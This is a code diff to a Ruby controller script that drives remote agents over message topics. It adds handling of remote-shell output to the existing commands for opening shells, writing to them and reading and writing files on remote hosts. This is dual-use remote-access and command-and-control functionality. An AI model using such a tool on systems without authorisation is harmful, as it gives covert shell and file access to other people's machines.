@@ -11,6 +11,15 @@ client.add_topic_callback("/bu/agents/#{ARGV[1]}/inators/file_rw/events/read") d
 	if ARGV[5] then File.binwrite(ARGV[5], packet.data, 0) else puts packet.data end
 end
 
+client.add_topic_callback("/bu/agents/#{ARGV[1]}/inators/remote_shell/events/read") do |packet|
+	packet = OpenStruct.new MessagePack.unpack(packet.payload)
+	if ARGV[4] then
+		File.binwrite(ARGV[4], packet.data, File.exists?(ARGV[4]) ? File.size(ARGV[4]) + 1 : 0) 
+	else 
+		puts packet.data 
+	end
+end
+
 case ARGV[0].to_i
 	when 1
 		@p = {
@@ -41,7 +50,7 @@ case ARGV[0].to_i
 		puts "Usage: ruby bu.rb 1..5 [REQUIRED:optional]..[REQUIRED:optional]"
 		puts "  1 [AGENT] [SHELL]".ljust(75) +														"Open a remote shell."
 		puts "  2 [AGENT] [PID]".ljust(75) +														"Close a remote shell."
-		puts "  3 [AGENT] [PID] [DATA]".ljust(75) +													"Write data to a remote shell."
+		puts "  3 [AGENT] [PID] [DATA] [local output file]".ljust(75) +								"Write data to a remote shell."
 		puts "  4 [AGENT] [REMOTE INPUT FILE] [LENGHT] [OFFSET] [local output file]".ljust(75) +	"Read a remote file."
 		puts "  5 [AGENT] [REMOTE OUTPUT FILE] [LOCAL INPUT FILE] [OFFSET]".ljust(75) +				"Read a remote file."
 		return
